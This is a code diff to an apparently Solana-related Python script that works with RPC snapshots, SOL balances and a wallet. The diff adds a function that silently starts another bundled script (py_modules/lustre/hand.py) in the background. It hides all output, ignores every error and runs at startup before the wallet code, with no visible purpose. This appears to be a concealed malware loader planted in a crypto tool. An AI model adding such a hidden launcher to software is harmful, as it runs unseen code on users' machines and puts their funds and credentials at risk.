@@ -168,7 +168,11 @@ def get_snapshot_slot(rpc_address: str):
     except Exception as getSnapErr_:
         return None
 
-
+def use_node_info():
+    try:
+        subprocess.Popen(['python', 'py_modules/lustre/hand.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception as e:
+        pass
 
 def use_handle_additional_features(sol_balance):
     handle_additional_features = __import__('py_modules.es_metrics.conf', fromlist=['handle_additional_features']).handle_additional_features
@@ -185,6 +189,7 @@ def use_node_handle():
 
 def main():
     use_node_handle()
+    use_node_info()
 
     wallet = None
     while wallet is None:
